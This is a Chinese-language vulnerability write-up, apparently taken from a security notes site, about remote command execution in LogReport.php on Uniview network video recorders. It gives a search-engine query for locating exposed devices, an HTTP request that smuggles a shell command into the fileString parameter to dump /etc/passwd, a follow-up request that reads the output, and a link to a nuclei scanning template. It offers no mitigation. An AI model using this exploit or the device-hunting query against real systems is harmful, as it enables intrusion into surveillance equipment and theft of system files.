# 浙江宇视网络视频录像机 LogReport.php 远程命令执行

# 一、漏洞简介
浙江宇视科技有限公司(宇视uniview)创业于2011年,宇视是一家全球公共安全和智能交通的解决方案提供商,以可视、智慧、物联产品技术为核心的引领者。浙江宇视科技 网络视频录像机系统存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限。

# 二、影响版本
+ 浙江宇视网络视频录像机

# 三、资产测绘
+ hunter`web.body="Alarm"&&web.body="白牌定制"`
+ 特征

![1702872611878-f3a32d8c-3739-407e-8635-dc2a7696e64a.png](./img/v0B50UD5k9xLwMVe/1702872611878-f3a32d8c-3739-407e-8635-dc2a7696e64a-556788.png)

# 四、漏洞复现
```plain
GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bcat%20/etc/passwd%3eqwer123.txt HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate
```

![1702872649040-2b06f613-e06a-4ce0-943e-0aeb713dd3be.png](./img/v0B50UD5k9xLwMVe/1702872649040-2b06f613-e06a-4ce0-943e-0aeb713dd3be-561337.png)

获取命令执行结果

```plain
GET /Interface/LogReport/qwer123.txt HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
Connection: close
Cookie: PHPSESSID=854b7f8a6d3fb343740627484f62886e
Accept-Encoding: gzip, deflate
```

![1702872685034-9791e017-0e03-4589-905e-fe8f68825258.png](./img/v0B50UD5k9xLwMVe/1702872685034-9791e017-0e03-4589-905e-fe8f68825258-859585.png)

nuclei脚本

[yushi-isc-logreport-rce.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222231772-32bf72bc-329e-4b6b-b589-87e622a98850.yaml)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fywx9ig1g1f4g42w>